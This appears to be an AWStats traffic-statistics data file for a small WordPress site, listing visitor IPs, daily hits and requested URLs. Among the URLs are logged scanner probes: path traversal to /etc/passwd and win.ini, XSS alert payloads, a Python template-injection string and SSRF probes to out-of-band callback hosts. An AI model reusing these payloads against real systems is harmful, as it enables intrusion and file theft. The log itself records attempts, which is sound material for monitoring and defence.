+103.119.112.42 2 2 109907 20250927140709
+192.185.4.72 1 1 221 20250927220352
+23.27.145.122 2 2 27166 20250926154605
+23.27.145.232 2 2 27166 20250920171509
+193.160.81.126 2 2 27166 20250925181331
+149.57.180.114 2 2 27166 20250921171117
+185.247.137.65 2 2 27228 20250914192434
+66.249.66.14 2 2 27228 20250917153439
+1.75.214.103 0 5 24422 
+118.193.56.246 1 1 13583 20250920070632
+52.72.120.115 2 2 27166 20250924090609
+15.204.182.106 4 4 54456 20250914211659
+149.57.180.46 2 2 27166 20250923160655
+47.237.155.117 1 1 527 20250920043022
+3.95.131.237 0 5 24422 
+205.210.31.76 1 1 7834 20250927001347
+119.12.166.6 0 1 4119 
+157.143.53.238 2 10 71200 20250915174922
+13.222.183.54 3 8 108350 20250921075230
+149.57.180.21 2 2 27228 20250916172927
+111.113.88.219 0 1 4119 
+149.57.180.144 2 2 27228 20250914181456
+103.4.250.148 2 3 31347 20250917062154
+103.4.251.187 0 1 1191 
+101.36.108.158 2 2 27149 20250918222837
+198.235.24.233 1 1 7740 20250930181158
+3.239.162.205 0 10 48844 
+134.199.90.41 1 1 13614 20250916022427
+147.185.132.225 2 2 101050 20250923094603
+52.90.56.137 0 5 24422 
+152.32.132.203 2 2 27166 20250918193834
+44.227.127.2 0 5 24422 
+118.26.36.18 1 1 13583 20250918223445
+101.36.123.67 2 2 27166 20250919202721
+118.194.251.58 1 1 13583 20250920205446
+104.197.69.115 1 3 71272 20250920211745
+162.142.125.42 2 2 27166 20250928075319
+52.91.94.143 2 2 27228 20250915230700
+221.232.249.221 4 10 86035 20250923071021
+35.129.115.37 0 2 2382 
+142.93.68.193 2 2 27166 20250928130704
+149.57.180.166 2 2 27166 20250920192021
+154.49.207.28 2 2 27228 20250915114858
+172.82.65.38 2 2 27166 20250925212345
+149.57.180.40 2 2 27166 20250928173628
+104.253.252.89 0 5 24422 
+95.177.180.82 4 4 54456 20250917212622
+163.172.155.93 2 2 27166 20250926025632
+172.111.15.192 0 5 24422 
+149.57.180.109 2 2 27228 20250915170141
+118.194.251.37 1 1 13583 20250920012122
+50.19.13.252 2 2 101088 20250917191239
+23.27.145.193 2 2 27166 20250918214101
+23.27.145.14 2 2 27166 20250923221219
+27.115.124.33 2 2 101088 20250917195933
+23.27.145.27 2 2 27228 20250916214146
+205.169.39.51 1 6 81184 20250920211912
+106.75.130.248 2 3 105207 20250917102801
+185.177.72.24 0 2 17672 
+106.75.50.6 1 1 13614 20250915182821
+34.77.70.95 2 9 354738 20250916022438
+106.75.129.36 2 2 101088 20250917102809
+154.220.164.250 0 1 4119 
+149.57.180.94 2 2 27166 20250920163338
+149.57.180.10 2 2 27166 20250921035236
+51.159.100.216 2 4 35466 20250915023627
+3.238.231.60 0 5 24422 
+107.172.195.218 0 1 1191 
+45.194.70.249 2 2 27166 20250920234218
+23.27.145.147 2 2 27166 20250922040449
+44.193.254.10 4 4 54456 20250917051745
+162.120.186.113 2 2 27166 20250928204623
+34.201.121.31 2 2 101088 20250917174423
+149.57.180.5 2 2 27166 20250930225041
+149.57.180.67 2 2 27228 20250915183054
+51.159.14.95 0 5 24422 
+156.248.54.133 0 3 12357 
+104.253.252.159 3 8 107015 20250927170040
+165.154.120.253 1 1 13566 20250918190917
+165.154.182.53 1 1 13566 20250918184858
+54.90.105.175 5 11 138300 20250923171549
+49.12.172.102 3 9 112469 20250919234122
+152.32.129.154 3 3 40749 20250919225001
+165.154.51.221 2 2 27166 20250919181047
+46.184.53.222 2 2 27228 20250916103809
+159.203.137.227 2 2 27166 20250927213151
+23.27.145.33 2 2 27166 20250920153348
+45.56.158.3 2 2 27166 20250922052901
+23.27.145.223 2 2 27166 20250927221601
+185.177.72.13 0 10 88360 
+34.214.218.157 2 4 35466 20250915051237
+107.172.195.47 0 1 1191 
+193.186.4.249 2 2 36778 20250928204624
+100.25.203.177 2 2 27166 20250919105106
+118.193.33.130 1 1 13566 20250918182645
+5.161.251.102 3 8 108350 20250919075106
+123.160.223.72 0 1 4119 
+172.82.144.17 2 3 31347 20250917063526
+3.83.152.134 3 8 108350 20250929084414
+165.154.206.204 1 1 13583 20250920111012
+185.177.72.21 0 2 17672 
+167.172.35.90 2 2 27166 20250923181820
+142.93.221.173 2 2 27166 20250929184928
+165.154.172.111 1 1 13583 20250919220648
+210.64.24.100 6 6 81560 20250925144454
+118.193.39.117 1 1 13583 20250920043613
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 18
+20250913 0 67 319868 0
+20250914 181 387 8530775 14
+20250915 76 85 969667 35
+20250916 91 100 1262285 26
+20250917 119 135 1947566 40
+20250918 1077 1110 14328067 49
+20250919 61 73 934758 29
+20250920 78 99 1185638 47
+20250921 43 69 721604 19
+20250922 41 50 451917 18
+20250923 42 75 800179 24
+20250924 21 25 198340 13
+20250925 43 52 547719 25
+20250926 27 32 251920 14
+20250927 49 64 732692 23
+20250928 44 50 506070 26
+20250929 28 33 325678 11
+20250930 26 42 372662 12
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 6
+30s-2mn 7
+2mn-5mn 3
+1h+ 14
+30mn-1h 20
+0s-30s 374
+5mn-15mn 7
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 25 first Pages must be first (order not required for others)
+BEGIN_SIDER 125
+/ 1195 16747213 242 217
+/wp-cron.php 188 0 138 138
+/jmx-console/ 87 1333275 0 0
+/index.php 70 953633 0 0
+/wp-admin/admin-ajax.php 40 3553 1 1
+/wp-content/themes/twentytwentyfive/assets/fonts/manrope/Manrope-VariableFont_wght.woff2 33 1768800 8 26
+/feed/ 26 18980 0 2
+/wp-login.php 23 125646 10 10
+/sample-page/ 23 315698 10 2
+/console/ 21 321825 0 0
+/comments/feed/ 20 14860 0 0
+/2025/09/14/hello-world/ 18 331002 3 2
+/cgi-sys/404.html 17 79509 0 0
+/xmlrpc.php 13 3845 1 1
+/placeholder-image/400x400 12 43464 0 1
+/apuestas/install/ 11 16640 1 0
+/author/ballosbet/ 10 135000 3 3
+/WebInterface/ 10 153250 0 0
+/wp-json/ 10 563070 0 9
+/wp-sitemap.xml 8 3689 3 5
+/wp-admin/profile.php 8 197720 0 0
+/webmail/basic/ 8 0 0 0
+/wp-admin/admin-post.php 6 0 0 1
+/user/login/ 6 91950 0 0
+/images/..%2finfo.html 6 28062 0 0
+/api/v1/attachments/..%2f..%2f..%2f..%2f..%2froot%2f/.flowise 2 9354 0 0
+/CRL/ 1 15325 0 0
+/wp-admin/load-styles.php 4 347600 0 0
+//CertEnroll/ 1 15325 0 0
+/wp-admin/upgrade.php 1 21 0 1
+/apuestas/assets/global/webfonts/fa-solid-900.woff2 1 270360 0 0
+//crl/ 1 15325 0 0
+/apuestas/assets/global/webfonts/fa-regular-400.woff2 1 315700 0 0
+/CertEnroll/ 1 15325 0 0
+/wp-admin/options-media.php 1 12618 0 0
+/wp-admin/options-privacy.php 2 27828 0 0
+/status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E 2 9354 0 0
+/static/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 2 9354 0 0
+/wp-admin/load-scripts.php 4 140569 0 0
+/Autodiscover/Autodiscover.xml 2 684 0 0
+/public/..%2F%5coast.pro%2F%3f%2F..%2F.. 2 9354 0 0
+/CertSrv/ 1 15325 0 0
+/assets/global/webfonts/fa-regular-400.woff2 1 315700 0 0
+/2025/09/14/hello-world/feed/ 2 1458 1 1
+/api/cors/data:text%2fhtml 2 9354 0 0
+/assets/global/webfonts/fa-light-300.woff2 1 340136 0 0
+/PKI/ 1 15325 0 0
+/restrito/ 2 30650 0 0
+//wp-config.php 1 0 0 0
+/wp-admin/options-reading.php 1 13805 0 0
+/category/uncategorized/ 4 54116 1 2
+/accounts/login/ 2 30650 0 0
+/asispanel/ 2 30650 0 0
+/webui 4 61300 0 0
+//CRL/ 1 15325 0 0
+/assets/global/fonts/la-solid-900.woff2 1 96752 0 0
+/admin 2 4812 0 0
+/javadoc/releases/javadoc/1.0.0/raw/..%5c..%2f..%2f..%2f..%2f..%2freposilite.db 2 9354 0 0
+/qvisdvr/ 2 30650 0 0
+// 2 27132 0 0
+/wp-admin/about.php 1 17169 0 0
+/workflow/ 2 30650 0 0
+/admin/general-setting 4 84656 0 0
+//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd 2 9354 0 0
+/vcac/ 2 30650 0 0
+/admin/dashboard 2 47468 0 0
+/wp-admin/options-general.php 3 144761 0 0
+/membership-registration/ 2 30650 0 0
+/fuel/login 4 61300 0 0
+//pki/ 1 15325 0 0
+/wp-admin/ 5 163518 1 0
+/wp-admin/options-writing.php 1 15198 0 0
+/wp-comments-post.php 1 1155 0 1
+/assets/global/webfonts/fa-duotone-900.woff2 1 353788 0 0
+/wp-admin/options-permalink.php 1 15013 0 0
+/crl/ 1 15325 0 0
+/pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd 2 9354 0 0
+/hac/ 2 30650 0 0
+/webui/ 2 30650 0 0
+/fuel/login/ 2 30650 0 0
+/check_charset.php 1 77 0 0
+/hmc/ 2 30650 0 0
+/wp-admin/options-discussion.php 1 15661 0 0
+/wp-content/themes/twentytwentyfive/assets/fonts/fira-code/FiraCode-VariableFont_wght.woff2 3 318336 0 1
+/wp-admin/users.php 1 16468 0 0
+/admin/chart/transaction 2 320 0 0
+/assets/global/fonts/la-regular-400.woff2 1 12900 0 0
+/api/cors/http:%2f%2fnextchat.d35u8vv3cnchvbat1p00y64aj8jehxwrz.oast.site%23 1 4677 0 0
+/certsrv/ 1 15325 0 0
+/api/cors/http:%2f%2fnextchat.d35u8vv3cnchvb4gjelgdjdcw775ag3h9.oast.me%23 1 4677 0 0
+/admin/categories 4 77182 0 0
+/wp-admin/themes.php 1 23616 0 0
+/assets/templates/basic/css/color.php 2 118 0 0
+//PKI/ 1 15325 0 0
+/admin/chart/deposit-withdraw 2 318 0 0
+//certsrv/ 1 15325 0 0
+/wp-json/wp/v2/users/ 3 942 0 0
+/bin/view/%22%5d%5d%20%7b%7basync%20async%3d%22true%22%20cached%3d%22false%22%20context%3d%22doc.reference%22%7d%7d%7b%7bpython%7d%7dprint%283724348%20%2a%208473334%29%7b%7b%2fpython%7d%7d%7b%7b%2fasync%7d%7d 2 9354 0 0
+//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00 2 9354 0 0
+/assets/file:%2f%2f/etc/passwd 3 14031 0 0
+/UploadService/Page/ 2 30650 0 0
+//CertSrv/ 1 15325 0 0
+/auth/login/ 2 30650 0 0
+/geoserver/ 2 30650 0 0
+//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00 2 9354 0 0
+/portalapi/v1/roles/option 2 9354 0 0
+/update_pass.php 1 90 1 0
+/prweb/ 2 30650 0 0
+/pki/ 1 15325 0 0
+/admin/system-setting 2 42680 0 0
+/wp-config.php 1 0 0 0
+/api/v2/parameters/core/ 2 30650 0 0
+/cookie/accept 2 0 0 0
+/admin/default/ 2 30650 0 0
+/camunda/app/welcome/default/ 2 30650 0 0
+/category/uncategorized/feed/ 2 1480 1 1
+/_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E 2 9354 0 0
+/file-manager/ 2 30650 0 0
+/assets/global/webfonts/fa-brands-400.woff2 1 104804 0 0
+//ocsp/ 1 15325 0 0
+/assets/global/fonts/la-brands-400.woff2 1 84772 0 0
+/assets/global/webfonts/fa-solid-900.woff2 1 270360 0 0
+/ocsp/ 1 15325 0 0
+/assets/global/webfonts/custom-fonts.woff 1 23644 0 0
+/geoserver/web/ 2 30650 0 0
+END_SIDER
+
+# Payload Range - Payload Frequency
+BEGIN_FILESIZE 7
+500-1K 395
+100-500 2349
+0-44 4227
+44-100 288
+5K+ 8372
+1K-2K 1245
+2K-5K 325
+END_FILESIZE
